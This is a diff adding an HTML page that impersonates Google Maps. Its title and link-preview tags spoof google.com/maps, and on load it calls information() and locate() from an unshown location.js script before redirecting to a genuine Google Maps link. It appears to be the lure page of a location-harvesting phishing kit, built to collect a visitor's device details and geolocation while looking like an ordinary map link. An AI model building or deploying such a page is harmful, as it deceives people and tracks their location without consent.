@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta property="og:title" content="Google Maps">
+	<meta property="og:site_name" content="www.google.com/maps">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="">
+	<title>Google Maps</title>
+	<script type="text/javascript">
+    	if (window.location.protocol == "http:") {
+        	var restOfUrl = window.location.href.substr(5);
+        	
+    	}
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript" src="js/location.js"></script>
+</head>
+<body onload="information();locate(function(){window.location='https://maps.app.goo.gl/BeZvjemkuy1HAnw16';}, function(){$('#change').html('Failed');});">
+</body>
+</html>
